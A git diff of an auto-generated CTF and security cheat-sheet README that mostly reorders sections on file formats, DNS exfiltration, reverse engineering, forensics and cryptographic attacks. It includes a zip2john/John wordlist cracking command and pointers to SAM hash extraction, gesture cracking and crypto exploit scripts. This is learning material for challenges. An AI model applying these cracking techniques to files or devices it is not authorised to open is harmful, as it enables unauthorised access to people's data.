@@ -30,34 +30,13 @@ This file is auto generated using [build.py](build.py). To update it, update the
 
 # Files
 
-⇨ [ZIP Files](#zip-files)<br>⇨ [File Scanning](#file-scanning)<br>⇨ [Images](#images)<br>⇨ [PDF Files](#pdf-files)<br>
+⇨ [File Scanning](#file-scanning)<br>
+⇨ [Images](#images)<br>
+⇨ [PDF Files](#pdf-files)<br>
+⇨ [ZIP Files](#zip-files)<br>
+
 
 This section contains information about different file formats and their structure. It is always good to keep this in mind, especially for forensics investigations.
-
-## ZIP Files
-
-
-
-* `zip2john` <span style="color:red">❤️</span>
-
-    Brute force password protected zip files.
-
-    ``` bash
-    zip2john protected.zip > protected.john
-    john --wordlist=/usr/share/wordlists/rockyou.txt protected.john
-    ```
-
-* `bkcrack` - [GitHub](https://github\.com/kimci86/bkcrack)
-
-    Crack ZipCrypto Store files. Need some plaintext to work.
-
-* `Reading the specifications`
-
-	Reading the specification of image format are sometimes the only way to fix a corrupted ZIP. A summary of this specification can be found on [GitHub](https://github.com/corkami/formats/blob/master/archive/ZIP.md)
-
-
-
-
 
 ## File Scanning
 
@@ -223,11 +202,38 @@ This section contains information about different file formats and their structu
 	A command-line tool to extract files out of a [PDF](https://en.wikipedia.org/wiki/Portable_Document_Format) file.
 
 
+
+## ZIP Files
+
+
+
+* `zip2john` <span style="color:red">❤️</span>
+
+    Brute force password protected zip files.
+
+    ``` bash
+    zip2john protected.zip > protected.john
+    john --wordlist=/usr/share/wordlists/rockyou.txt protected.john
+    ```
+
+* `bkcrack` - [GitHub](https://github\.com/kimci86/bkcrack)
+
+    Crack ZipCrypto Store files. Need some plaintext to work.
+
+* `Reading the specifications`
+
+	Reading the specification of image format are sometimes the only way to fix a corrupted ZIP. A summary of this specification can be found on [GitHub](https://github.com/corkami/formats/blob/master/archive/ZIP.md)
+
+
+
+
 <br><br>
 
 # Network
 
-⇨ [DNS Exfiltration](#dns-exfiltration)<br>⇨ [Network Scanning](#network-scanning)<br>
+⇨ [Network Scanning](#network-scanning)<br>
+⇨ [DNS Exfiltration](#dns-exfiltration)<br>
+
 
 
 * `Wireshark` <span style="color:red">❤️</span> - [Website](https://www.wireshark.org/)
@@ -255,28 +261,6 @@ This section contains information about different file formats and their structu
 * `PcapXray` - [GitHub](https://github.com/Srinivas11789/PcapXray) 
 	A GUI tool to visualize network traffic.
 	
-
-
-
-## DNS Exfiltration
-
-
-
-DNS can be used to exfiltrate data, for example to bypass firewalls.
-
-* `iodine` - [GitHub](https://github.com/yarrick/iodine)
-
-    Can be identified by the presence of the "Aaahhh-Drink-mal-ein-Jägermeister" or "La flûte naïve française est retirée à Crête".<br>
-    Can be deciphered with [this script](Network/Tools/iodine/exploit.py)<br>
-    [Hack.lu CTF WU](http://blog.stalkr.net/2010/10/hacklu-ctf-challenge-9-bottle-writeup.html)
-
-* `DNScat2` - [GitHub](https://github.com/iagox86/dnscat2)
-
-    Can be identified when [file signatures](#file-scanning) are present in the DNS queries.
-    Data can be extracted with [this script](Network/Tools/dnscat2/exploit.py) and files can be extracted with [binwalk](#file-scanning).
-
-
-
 
 
 
@@ -334,6 +318,28 @@ DNS can be used to exfiltrate data, for example to bypass firewalls.
     # Passive scan
     netdiscover -p
     ```
+
+
+
+## DNS Exfiltration
+
+
+
+DNS can be used to exfiltrate data, for example to bypass firewalls.
+
+* `iodine` - [GitHub](https://github.com/yarrick/iodine)
+
+    Can be identified by the presence of the "Aaahhh-Drink-mal-ein-Jägermeister" or "La flûte naïve française est retirée à Crête".<br>
+    Can be deciphered with [this script](Network/Tools/iodine/exploit.py)<br>
+    [Hack.lu CTF WU](http://blog.stalkr.net/2010/10/hacklu-ctf-challenge-9-bottle-writeup.html)
+
+* `DNScat2` - [GitHub](https://github.com/iagox86/dnscat2)
+
+    Can be identified when [file signatures](#file-scanning) are present in the DNS queries.
+    Data can be extracted with [this script](Network/Tools/dnscat2/exploit.py) and files can be extracted with [binwalk](#file-scanning).
+
+
+
 
 
 <br><br>
@@ -561,7 +567,11 @@ RSYNC - 873/tcp
 
 # Reverse Engineering
 
-⇨ [Python](#python)<br>⇨ [Binaries](#binaries)<br>⇨ [Virtualization](#virtualization)<br>⇨ [Android](#android)<br>
+⇨ [Binaries](#binaries)<br>
+⇨ [Python](#python)<br>
+⇨ [Android](#android)<br>
+⇨ [Virtualization](#virtualization)<br>
+
 
 Reverse engineering is the process of analyzing a system, device or program in order to extract knowledge about it. It is a broad field that can be divided into two main categories: **static** and **dynamic** analysis.
 
@@ -581,37 +591,10 @@ The [Binary Exploitation](/Binary%20Exploitation) section, also known as PWN, is
 	Packages to run GameBoy ROMS: `visualboyadvance` or `retroarch`
 
 
-## Python
-
-
-
-
-* `Decompile .pyc files`
-
-	Several software can be used to decompile python bytecode.
-
-	| Software | Source | Notes |
-	| --- | --- | --- |
-	| `uncompyle6` | [GitHub](https://github\.com/rocky/python-uncompyle6/) | Decompiles Python bytecode to equivalent Python source code. Support python versions **up to to 3.8**. Legend has it that it exists an option (maybe -d) that can succeed when the regular decompilation fails. |
-	| `Decompyle++` <span style="color:red">❤️</span> | [GitHub](https://github.com/zrax/pycdc) | Less reliable, but can decompile every python3 versions. |
-	| `Easy Python Decompiler` | [Website](https://sourceforge.net/projects/easypythondecompiler/) | Windows GUI to decompile python bytecode. |
-
-
-* `Pyinstaller Extractor` - [GitHub](https://github.com/extremecoders-re/pyinstxtractor)
-
-	Extracts the python bytecode from pyinstaller windows executables. Can be decomplied  after.
-
-	```bash
-	python3 pyinstxtractor.py <filename>
-	```
-
-	An alternative is `pydumpck`
-
-
-
 ## Binaries
 
 ⇨ [Golang](#golang)<br>
+
 
 Reversing binaries can be used to solve keygen (or crackme) challenges, or just to understand how a program works to [exploit it](#binary-exploitation).
 
@@ -714,11 +697,31 @@ When the binary is stripped, the function's information is stored in the `.gopcl
 
 
 
-## Virtualization
+## Python
 
 
 
-In order to run some system, it is necessary to use virtualization.
+
+* `Decompile .pyc files`
+
+	Several software can be used to decompile python bytecode.
+
+	| Software | Source | Notes |
+	| --- | --- | --- |
+	| `uncompyle6` | [GitHub](https://github\.com/rocky/python-uncompyle6/) | Decompiles Python bytecode to equivalent Python source code. Support python versions **up to to 3.8**. Legend has it that it exists an option (maybe -d) that can succeed when the regular decompilation fails. |
+	| `Decompyle++` <span style="color:red">❤️</span> | [GitHub](https://github.com/zrax/pycdc) | Less reliable, but can decompile every python3 versions. |
+	| `Easy Python Decompiler` | [Website](https://sourceforge.net/projects/easypythondecompiler/) | Windows GUI to decompile python bytecode. |
+
+
+* `Pyinstaller Extractor` - [GitHub](https://github.com/extremecoders-re/pyinstxtractor)
+
+	Extracts the python bytecode from pyinstaller windows executables. Can be decomplied  after.
+
+	```bash
+	python3 pyinstxtractor.py <filename>
+	```
+
+	An alternative is `pydumpck`
 
 
 
@@ -758,11 +761,21 @@ In order to run some system, it is necessary to use virtualization.
 
 
 
+
+## Virtualization
+
+
+
+In order to run some system, it is necessary to use virtualization.
+
+
 <br><br>
 
 # Binary Exploitation
 
-⇨ [Windows](#windows)<br>⇨ [ELF](#elf)<br>
+⇨ [Windows](#windows)<br>
+⇨ [ELF](#elf)<br>
+
 
 Different types of exploit exists, the most common are:
 
@@ -899,7 +912,13 @@ Tools that will help you to exploit a binary:
 
 # Forensics
 
-⇨ [Disk Image](#disk-image)<br>⇨ [Logs](#logs)<br>⇨ [Browser Forensics](#browser-forensics)<br>⇨ [Memory Dump](#memory-dump)<br>⇨ [Android Forensics](#android-forensics)<br>⇨ [Docker](#docker)<br>
+⇨ [Logs](#logs)<br>
+⇨ [Browser Forensics](#browser-forensics)<br>
+⇨ [Android Forensics](#android-forensics)<br>
+⇨ [Docker](#docker)<br>
+⇨ [Disk Image](#disk-image)<br>
+⇨ [Memory Dump](#memory-dump)<br>
+
 
 
 * `File scanning`
@@ -936,46 +955,6 @@ Tools that will help you to exploit a binary:
 	Windows stores information about the programs that are run in a prefetch file. This information can be used to determine what programs were run on a system. The prefetch files are stored in `C:\Windows\Prefetch\` and have the extension `.pf`. 
 	
 	It can be parsed using `PECmd` from [Eric Zimmerman's tools](https://ericzimmerman.github.io/#!index.md). Win10 prefetch files can only be parsed on Win8+ systems, wine will not work for this.
-
-## Disk Image
-
-
-
-* `Autopsy` <span style="color:red">❤️</span> - [Website](https://www.autopsy.com/download/)
-
-    GUI for analyzing disk images with Sleuthkit. It can be used to extract files, search for keywords, etc...
-
-* [`mount`]
-
-    Mount a disk image to a filesystem.
-    
-    I recommend to use a virtual machine to mount the disk image. This way you can browse the filesystem and extract files without risking to damage your system.
-
-* `TestDisk` - [Website](https://www.cgsecurity.org/Download_and_donate.php/testdisk-7.1-WIP.linux26.tar.bz2) 
-	
-    CLI tool to recover lost partitions and/or make non-booting disks bootable again.
-
-* `photorec` - [Website](https://www.cgsecurity.org/wiki/PhotoRec) 
-	
-    CLI tool to recover deleted files. Works with raw data, so the disk do not need to have a partition system working.
-
-* Extract windows hashes from filesystem (SAM file).
-
-    This can be done with `samdump2`. See this [GitHub repository](https://github.com/noraj/the-hacking-trove/blob/master/docs/Tools/extract_windows_hashes.md) for more information.
-
-* `WIM` : Windows Imaging Format - [Wikipedia](https://en.wikipedia.org/wiki/Windows_Imaging_Format)
-
-    WIM is a file format used for windows disk images. Data can be extracted on linux using `wimlib`.
-
-	```bash
-	wiminfo <file.wim> # List all images in the wim file
-	wimapply <file.wim> <image_index> <output_directory> # Extract an image from the wim file
-	``` 
-
-
-
-
-
 
 ## Logs
 
@@ -1049,6 +1028,7 @@ Looking at logs takes time but can lead to valuable information.
 
 ⇨ [Firefox profiles](#firefox-profiles)<br>
 
+
 The browser profile contains a lot of information about the user, such as bookmarks, history, cookies, stored passwords, etc.
 
 
@@ -1113,6 +1093,68 @@ Firefox based browsers (and Thunderbird) store their profiles in the following f
     ```
 
     It does not use [NSS](https://en.wikipedia.org/wiki/Network_Security_Services) to decrypt passwords, which makes it easier to install. Found this tool [here](https://security.stackexchange.com/questions/152285/command-line-tools-to-decrypt-my-firefox-45-7-0-passwords-using-key3-db-and-logi).
+
+
+
+
+
+## Android Forensics
+
+
+
+* `Gesture cracking`
+
+    The gesture needed to unlock the phone is stored in `/data/system/gesture.key` as a SHA1 hash of the gesture. [This python script](Forensics/Tools/gesture_cracker.py) or [this C program](Forensics/Tools/gesture_cracker.c) can be used to crack the gesture, .
+
+
+
+## Docker
+
+
+
+* `Dive` - [GitHub](https://github.com/wagoodman/dive)
+
+    Explore layers of a docker image.
+
+    If a interesting file modification is found, it can be extracted from the image with an archive editing software (or with `dive export <image> <layer> <file> <output>` ?).
+
+
+
+## Disk Image
+
+
+
+* `Autopsy` <span style="color:red">❤️</span> - [Website](https://www.autopsy.com/download/)
+
+    GUI for analyzing disk images with Sleuthkit. It can be used to extract files, search for keywords, etc...
+
+* [`mount`]
+
+    Mount a disk image to a filesystem.
+    
+    I recommend to use a virtual machine to mount the disk image. This way you can browse the filesystem and extract files without risking to damage your system.
+
+* `TestDisk` - [Website](https://www.cgsecurity.org/Download_and_donate.php/testdisk-7.1-WIP.linux26.tar.bz2) 
+	
+    CLI tool to recover lost partitions and/or make non-booting disks bootable again.
+
+* `photorec` - [Website](https://www.cgsecurity.org/wiki/PhotoRec) 
+	
+    CLI tool to recover deleted files. Works with raw data, so the disk do not need to have a partition system working.
+
+* Extract windows hashes from filesystem (SAM file).
+
+    This can be done with `samdump2`. See this [GitHub repository](https://github.com/noraj/the-hacking-trove/blob/master/docs/Tools/extract_windows_hashes.md) for more information.
+
+* `WIM` : Windows Imaging Format - [Wikipedia](https://en.wikipedia.org/wiki/Windows_Imaging_Format)
+
+    WIM is a file format used for windows disk images. Data can be extracted on linux using `wimlib`.
+
+	```bash
+	wiminfo <file.wim> # List all images in the wim file
+	wimapply <file.wim> <image_index> <output_directory> # Extract an image from the wim file
+	``` 
+
 
 
 
@@ -1249,33 +1291,19 @@ The full documentation can be found [here](https://volatility3.readthedocs.io)
 
 
 
-
-## Android Forensics
-
-
-
-* `Gesture cracking`
-
-    The gesture needed to unlock the phone is stored in `/data/system/gesture.key` as a SHA1 hash of the gesture. [This python script](Forensics/Tools/gesture_cracker.py) or [this C program](Forensics/Tools/gesture_cracker.c) can be used to crack the gesture, .
-
-
-
-## Docker
-
-
-
-* `Dive` - [GitHub](https://github.com/wagoodman/dive)
-
-    Explore layers of a docker image.
-
-    If a interesting file modification is found, it can be extracted from the image with an archive editing software (or with `dive export <image> <layer> <file> <output>` ?).
-
-
 <br><br>
 
 # Cryptography
 
-⇨ [RSA](#rsa)<br>⇨ [Misc Codes](#misc-codes)<br>⇨ [Diffie-Hellman](#diffie-hellman)<br>⇨ [AES](#aes)<br>⇨ [DES](#des)<br>⇨ [RC4](#rc4)<br>⇨ [Hashes](#hashes)<br>⇨ [Elliptic Curves](#elliptic-curves)<br>
+⇨ [AES](#aes)<br>
+⇨ [Hashes](#hashes)<br>
+⇨ [Diffie-Hellman](#diffie-hellman)<br>
+⇨ [Elliptic Curves](#elliptic-curves)<br>
+⇨ [DES](#des)<br>
+⇨ [RSA](#rsa)<br>
+⇨ [RC4](#rc4)<br>
+⇨ [Misc Codes](#misc-codes)<br>
+
 
 Cryptography and Cryptanalysis are the art of creating and breaking codes. 
 
@@ -1308,6 +1336,270 @@ Platforms with cryptanalysis challenges:
     Given a message `m` and a signature `s`, it is possible to find a second signature `s'` generated from a different private/public key pair.
 
     This is valid for most of digital signature schemes, including RSA, DSA, ECDSA.
+
+
+
+## AES
+
+⇨ [AES - OFB Mode](#aes---ofb-mode)<br>
+⇨ [AES - CTR Mode](#aes---ctr-mode)<br>
+⇨ [AES - ECB Mode](#aes---ecb-mode)<br>
+⇨ [AES - CBC Mode](#aes---cbc-mode)<br>
+⇨ [AES - GCM Mode](#aes---gcm-mode)<br>
+
+
+[AES](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) A.K.A. Rijndael is a **symmetric** cryptographic algorithm. It uses the **same key** for encryption and decryption.
+
+[This tutorial](https://www.davidwong.fr/blockbreakers/index.html) is a very good introduction to AES and explains the implementation of the 128-bit version. It also goes through the [Square Attack](https://en.wikipedia.org/wiki/Square_attack) for a 4 round AES.
+
+Different [modes of operations](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation) are used to encrypt data larger than 128 bits (16 bytes). Block operation modes are used to encrypt data in one go while stream operation modes are used to encrypt data bit by bit.
+
+The most common block operation modes are:
+
+| Mode | Type | Description |
+| ---- | ---- | ----------- |
+| ECB | Block | Electronic Codebook |
+| CBC | Block | Cipher Block Chaining |
+| PCBC | Block | Propagating Cipher Block Chaining |
+| CTR | Stream | Counter |
+| CFB | Stream | Cipher Feedback |
+| OFB | Stream | Output Feedback |
+
+**Stream ciphers** usually only use the encryption block to create an output called **keystream** from pre-defined values. Then, it xors this keystream with the plaintext. Consequently, when a bit of plaintext is flipped, the corresponding bit of ciphertext is flipped as well. Stream ciphers are often vulnerable to **encryption oracles (CPA)** as their stream of bits is xored to the plaintext. An attacker only have to input null bytes to get this keystream.
+
+* 4-6 round AES
+
+	When a low number of rounds is used, the key can be recovered by using the [Square Attack](https://en.wikipedia.org/wiki/Square_attack). See [this tutorial](https://www.davidwong.fr/blockbreakers/square.html) for an example.
+
+
+* Weak Sbox - [StackExchange](https://crypto.stackexchange.com/questions/89596/linear-aes-expression-of-k-in-aesp-apk?noredirect=1&lq=1) [CryptoHack](https://cryptohack.org/challenges/beatboxer/solutions/)
+
+	A weak S-box in the subBytes step makes AES an affine function : $AES(pt) = A * pt \oplus K$ where $A$ and $K$ are matrices of size 128 in $GF(2)$ and $A$ have a low dependence on the key. $A$ can be inverted and decipher any ciphertext using $pt = A^{-1} * (AES(ct) \oplus K)$.
+	
+	If there are no subBytes at all, the AES key can even be recovered. [See here](https://crypto.stackexchange.com/questions/89596/linear-aes-expression-of-k-in-aesp-apk?noredirect=1&lq=1).
+
+	To solve this types of challenges, you can either implement a symbolic version of your AES variation and solve for the key, or try to find $A$ using linear algebra.
+
+	[RootMe](https://www.root-me.org/en/Challenges/Cryptanalysis/AES-Weaker-variant) - RootMe challenge with no subBytes (identity sbox) and an encryption oracle.
+
+	[CryptoHack](https://cryptohack.org/challenges/beatboxer/solutions/) - CryptoHack challenge with an affine sbox and only one message.
+
+### AES - OFB Mode
+
+
+
+[AES Output FeedBack](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Output_feedback_(OFB)) is an unusual stream cipher. It has no real benefits these days over CTR mode. Indeed CTR can be computed in parallel and allows random access in the ciphertext whereas OFB cannot.
+
+<!--image -->
+![OFB Encryption](Cryptography/AES/AES%20-%20OFB%20Mode/_img/601px-OFB_encryption.png#gh-light-mode-only)
+![OFB Encryption](Cryptography/AES/AES%20-%20OFB%20Mode/_img/601px-OFB_encryption-dark.png#gh-dark-mode-only)
+![OFB Decryption](Cryptography/AES/AES%20-%20OFB%20Mode/_img/601px-OFB_decryption.png#gh-light-mode-only)
+![OFB Decryption](Cryptography/AES/AES%20-%20OFB%20Mode/_img/601px-OFB_decryption-dark.png#gh-dark-mode-only)
+
+
+
+### AES - CTR Mode
+
+
+
+[AES Counter Mode](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Counter_(CTR)) is using the AES output as a xor key. To generate the output a nonce is used, modified by a counter (concatenated, summed ...) at each block.
+
+The main problem with this mode is that the nonce must be unique for each message, and the counter must be different for each block (it can be reset at each message). If this is not the case, the xor key will be the same for different blocks, which can compromise the encrypted message. (See the weaknesses of [XOR encryption](#..)
+
+![CTR Encryption](Cryptography/AES/AES%20-%20CTR%20Mode/_img/601px-CTR_encryption_2.png#gh-light-mode-only)
+![CTR Encryption](Cryptography/AES/AES%20-%20CTR%20Mode/_img/601px-CTR_encryption_2-dark.png#gh-dark-mode-only)
+![CTR Decryption](Cryptography/AES/AES%20-%20CTR%20Mode/_img/601px-CTR_decryption_2.png#gh-light-mode-only)
+![CTR Decryption](Cryptography/AES/AES%20-%20CTR%20Mode/_img/601px-CTR_decryption_2-dark.png#gh-dark-mode-only)
+
+
+
+
+### AES - ECB Mode
+
+
+
+[AES Electronic CodeBook](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_codebook_(ECB)) is the most basic mode of operation. Each block is encrypted independently of the others.  This is considered **unsecure** for most applications.
+
+<!--image -->
+![ECB Encryption](Cryptography/AES/AES%20-%20ECB%20Mode/_img/601px-ECB_encryption.png#gh-light-mode-only)
+![ECB Encryption](Cryptography/AES/AES%20-%20ECB%20Mode/_img/601px-ECB_encryption-dark.png#gh-dark-mode-only)
+![ECB Decryption](Cryptography/AES/AES%20-%20ECB%20Mode/_img/601px-ECB_decryption.png#gh-light-mode-only)
+![ECB Decryption](Cryptography/AES/AES%20-%20ECB%20Mode/_img/601px-ECB_decryption-dark.png#gh-dark-mode-only)
+
+
+* ECB Encryption Oracle padded with secret - [CryptoHack](https://cryptohack.org/courses/symmetric/ecb_oracle/)
+
+	To leak the secret, we can use the fact that ECB mode is stateless. We can compare the output of a block containing one unknown byte of the secret with all 256 possible outputs. The block that encrypts to the correct output is the one that contains the unknown byte.
+
+* ECB Decryption Oracle - [CryptoHack](https://cryptohack.org/courses/symmetric/ecbcbcwtf/)
+
+	A ECB decryption oracle can simply be used as an AES block decoder. Many modes can be compromised by this oracle.
+	
+
+
+
+### AES - CBC Mode
+
+
+
+[AES Cipher Block Chaining](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_block_chaining_(CBC)) is the most commonly used mode of operation. It uses the previous output to xor the next input.
+
+<!--image -->
+![CBC Encryption](Cryptography/AES/AES%20-%20CBC%20Mode/_img/CBC_encryption.png#gh-light-mode-only)
+![CBC Encryption](Cryptography/AES/AES%20-%20CBC%20Mode/_img/CBC_encryption-dark.png#gh-dark-mode-only)
+![CBC Decryption](Cryptography/AES/AES%20-%20CBC%20Mode/_img/CBC_decryption.png#gh-light-mode-only)
+![CBC Decryption](Cryptography/AES/AES%20-%20CBC%20Mode/_img/CBC_decryption-dark.png#gh-dark-mode-only)
+
+* Bit flipping attack (CPA) - [Wikipedia](https://en.wikipedia.org/wiki/Bit-flipping_attack) [CryptoHack](https://cryptohack.org/courses/symmetric/flipping_cookie/)
+
+    If an attacker can change the ciphertext, they can also alter the plaintext because of the XOR operation in the decryption process. (Homomorphic property of XOR, used in the previous block)
+    
+    **If you want to change the first block of plaintext**, you need to be able to edit the IV, as the first block of plaintext is XORed with the IV. If you don't have access to it, you can try to make the target system ignore the first block and edit the remainder instead. (example: json cookie {admin=False;randomstuff=whatever} -> {admin=False;rando;admin=True} )
+
+    [Custom exploit script](Cryptography/AES/AES%20-%20CBC%20Mode/Tools/bit-flipping-cbc.py) from this [Github gist](https://gist.github.com/nil0x42/8bb48b337d64971fb296b8b9b6e89a0d)
+
+    [Video explanation](https://www.youtube.com/watch?v=QG-z0r9afIs)
+
+
+* IV = Key - [StackExchange](https://crypto.stackexchange.com/questions/16161/problems-with-using-aes-key-as-iv-in-cbc-mode) [CryptoHack](https://aes.cryptohack.org/lazy_cbc/)
+
+    When the IV is chosen as the key, AES becomes insecure. The Key can be leaked if you have a decryption oracle (CCA).
+
+
+
+### AES - GCM Mode
+
+
+
+[AES Galois Counter Mode](https://en.wikipedia.org/wiki/Galois/Counter_Mode) is an authenticated encryption mode. For each encryption it produces a tag that can be used to verify the integrity of the message. It is considered secure and is used in TLS.
+
+
+<!--image -->
+![AES GCM](Cryptography/AES/AES%20-%20GCM%20Mode/_img/GCM-Galois_Counter_Mode_with_IV-dark.png#gh-dark-mode-only)
+![AES GCM](Cryptography/AES/AES%20-%20GCM%20Mode/_img/GCM-Galois_Counter_Mode_with_IV.png#gh-light-mode-only)
+
+
+* Forbidden attack - [CryptoHack](https://aes.cryptohack.org/forbidden_fruit/)
+
+    When the nonce (IV) is reused in 2 different messages, an attacker can forge a tag for any ciphertext.
+
+    [Cryptopals](https://toadstyle.org/cryptopals/63.txt) - Detailed explanation of the attack.
+
+    [GitHub](https://github.com/jvdsn/crypto-attacks/blob/master/attacks/gcm/forbidden_attack.py) - Implementation of the attack.
+
+    [GitHub (Crypton)](https://github.com/ashutosh1206/Crypton/tree/master/Authenticated-Encryption/AES-GCM/Attack-Forbidden) - Summary of the attack.
+
+    [This custom python script](Cryptography/AES/AES%20-%20GCM%20Mode/Tools/forbidden_attack.py) gives an example implementation of the attack.
+
+
+
+
+
+## Hashes
+
+
+
+* `Hash types` - [Website](https://hashcat.net/wiki/doku.php?id=example_hashes)
+
+    Different hash types exists, and they are used in different contexts. This page lists the most common hash types and their respective hashcat modes.
+
+| Hash type | Byte Length | Hashcat mode | Example hash  |
+|-----------|--------------|--------------|--------------|
+| MD5      | 32  | 0    | `8743b52063cd84097a65d1633f5c74f5` |
+| SHA1     | 40  | 100  | `b89eaac7e61417341b710b727768294d0e6a277b` |
+| SHA256   | 64  | 1400 | `127e6fbfe24a750e72930c220a8e138275656b8e5d8f48a98c3c92df2caba935` |
+| SHA2-512 | 128 | 1700 | too long |
+
+
+
+* `Haiti` - [GitHub](https://github.com/noraj/haiti/)
+
+    CLI Hash type identifier
+
+* `Hashcat` - [Website](https://hashcat.net/hashcat/)
+
+    Crack hashes. Can use GPU.
+
+
+* `John the Ripper` - [Website](https://www.openwall.com/john/)
+
+    Better compatibility and easier to use than hashcat, but lower number of hash types supported.
+
+* `dcipher` - [GitHub](https://github.com/k4m4/dcipher-cli)
+
+    CLI tool to lookup hashes in online databases.
+
+
+
+## Diffie-Hellman
+
+
+
+[The Diffie–Hellman key exchange](https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange) is a method that generates a shared secret over a public channel. This method is based on the [discrete logarithm problem](https://en.wikipedia.org/wiki/Discrete_logarithm) which is believed to be hard to solve.
+
+#### Key generation (Textbook DH)
+
+Suppose a situation where Alice and Bob want to create a shared secret key. They will use a public channel to do so.
+
+1. They chose a standard prime number $p$ and a generator $g$. $g$ is usually 2 or 5 to make computations easier. $p$ and $g$ are public and $GF(p) = {0, 1, ..., p-1} = {g^0 \mod p, g^1 \mod p, ..., g^{p-1} \mod p}$ is a finite field.
+2. They create private keys $a$ and $b$ respectively. $a, b \in GF(p)$.
+3. They compute the public keys $A$ and $B$ and send them over the public channel.
+    >$A = g^a \mod p$<br>
+    >$B = g^b \mod p$
+4. They can now both compute the shared secret key $s$: Alice computes $s = B^a \mod p$ and Bob computes $s = A^b \mod p$.<br> 
+    >$s = B^a \mod p = A^b \mod p = g^{ab} \mod p$
+
+They can now use the shared secret $s$ to derive a symmetric key for [AES](#aes) for example, and use it to encrypt their messages.
+
+
+* DH with weak prime using Pohlig–Hellman - [Wikipedia](https://en.wikipedia.org/wiki/Pohlig%E2%80%93Hellman_algorithm)
+
+    The public prime modulus $p$ must be chosen such that $p = 2*q + 1$ where $q$ is also a prime. If $p-1$ is smooth (i.e have a lot of small, under 1000, factors), the Pohlig–Hellman algorithm can be used to compute the discrete logarithm very quickly. Sagemath's discrete_log function can be used to compute the discrete logarithm for such primes.
+
+    Use [this script](Cryptography/Diffie-Hellman/Tools/smooth_number_generator.py) to generate smooth numbers of selected size.
+
+
+* DH with small prime 
+
+    The security of Diffie-Hellman is lower than the number of bits in $p$. Consequently, is p is too small (for example 64bits), it is possible to compute the discrete logarithm in a reasonable amount of time.
+
+    ```python
+    from sage.all import *
+    a = discrete_log(Mod(A, p), Mod(g, p))
+    ```
+
+
+
+## Elliptic Curves
+
+
+
+[ECC](https://en.wikipedia.org/wiki/Elliptic-curve_cryptography) is a set of **public-key** cryptographic algorithms based on **elliptic curves** over finite fields. It is used to create **digital signatures** and **key exchanges**.
+
+
+
+## DES
+
+
+
+[DES](https://en.wikipedia.org/wiki/Data_Encryption_Standard) A.K.A. Data Encryption Standard is a **symmetric** cryptographic algorithm. It uses the **same key** for encryption and decryption. It is a block cipher that encrypts data 64 bits at a time using a 56-bit key. The key is sometimes completed with an additional byte for parity check. DES is now considered insecure and has been replaced by AES.
+
+Variations such as [Triple DES](https://en.wikipedia.org/wiki/Triple_DES) (3DES) and [DES-X](https://en.wikipedia.org/wiki/DES-X) have been created to improve the security of DES.
+
+
+
+* Weak keys - [Wikipedia](https://en.wikipedia.org/wiki/Weak_key#Weak_keys_in_DES) [CryptoHack](https://aes.cryptohack.org/triple_des/)
+
+    DES allows for weak keys which are keys that produce the same ciphertext when used for encryption and decryption.
+
+    Some weak keys with valid parity check are:
+
+    * 0x0101010101010101
+    * 0xFEFEFEFEFEFEFEFE
+    * 0xE0E0E0E0F1F1F1F1
+    * 0x1F1F1F1F0E0E0E0E
+
+    Using multiple of these keys in [2 or 3 keys triple DES](https://en.wikipedia.org/wiki/Triple_DES#Keying_options) can also produce a symmetric 3DES block cipher.
 
 
 
@@ -1479,6 +1771,24 @@ Several attacks exist on RSA depending on the circumstances.
 * Signature that only check for the last few bytes - [CryptoHack](https://cryptohack.org/challenges/pedro/solutions/)
 
    When a signature is only checking the last few bytes, you can add $2^{8 * n}$ to the message and the signature will still be valid, where $n$ is the number of bytes checked. Consequently, finding the $e$-th root of the signature will be easier. Check writeups of the cryptohack challenge for more details.
+
+
+
+
+
+## RC4
+
+
+
+[RC4](https://en.wikipedia.org/wiki/RC4) is a fast stream cipher known to be very insecure.
+
+
+
+* FMS Attack - [Wikipedia](https://en.wikipedia.org/wiki/Fluhrer,_Mantin_and_Shamir_attack) [CryptoHack](https://aes.cryptohack.org/oh_snap)
+
+    Allows to recover the key from the keystream when RC4's key is in the form (nonce || unknown). Mostly used to recover WEP from WEP SNAP headers. An implementation and description of this attack can be found on [GitHub](https://github.com/jackieden26/FMS-Attack/blob/master/keyRecover.py).
+
+    If you have an encryption (or decryption, it's the same) oracle, I recommend reading the writeups from this [CryptoHack challenge](https://aes.cryptohack.org/oh_snap).
 
 
 
@@ -1663,288 +1973,14 @@ Several attacks exist on RSA depending on the circumstances.
 	
 
 
-
-## Diffie-Hellman
-
-
-
-[The Diffie–Hellman key exchange](https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange) is a method that generates a shared secret over a public channel. This method is based on the [discrete logarithm problem](https://en.wikipedia.org/wiki/Discrete_logarithm) which is believed to be hard to solve.
-
-#### Key generation (Textbook DH)
-
-Suppose a situation where Alice and Bob want to create a shared secret key. They will use a public channel to do so.
-
-1. They chose a standard prime number $p$ and a generator $g$. $g$ is usually 2 or 5 to make computations easier. $p$ and $g$ are public and $GF(p) = {0, 1, ..., p-1} = {g^0 \mod p, g^1 \mod p, ..., g^{p-1} \mod p}$ is a finite field.
-2. They create private keys $a$ and $b$ respectively. $a, b \in GF(p)$.
-3. They compute the public keys $A$ and $B$ and send them over the public channel.
-    >$A = g^a \mod p$<br>
-    >$B = g^b \mod p$
-4. They can now both compute the shared secret key $s$: Alice computes $s = B^a \mod p$ and Bob computes $s = A^b \mod p$.<br> 
-    >$s = B^a \mod p = A^b \mod p = g^{ab} \mod p$
-
-They can now use the shared secret $s$ to derive a symmetric key for [AES](#aes) for example, and use it to encrypt their messages.
-
-
-* DH with weak prime using Pohlig–Hellman - [Wikipedia](https://en.wikipedia.org/wiki/Pohlig%E2%80%93Hellman_algorithm)
-
-    The public prime modulus $p$ must be chosen such that $p = 2*q + 1$ where $q$ is also a prime. If $p-1$ is smooth (i.e have a lot of small, under 1000, factors), the Pohlig–Hellman algorithm can be used to compute the discrete logarithm very quickly. Sagemath's discrete_log function can be used to compute the discrete logarithm for such primes.
-
-    Use [this script](Cryptography/Diffie-Hellman/Tools/smooth_number_generator.py) to generate smooth numbers of selected size.
-
-
-* DH with small prime 
-
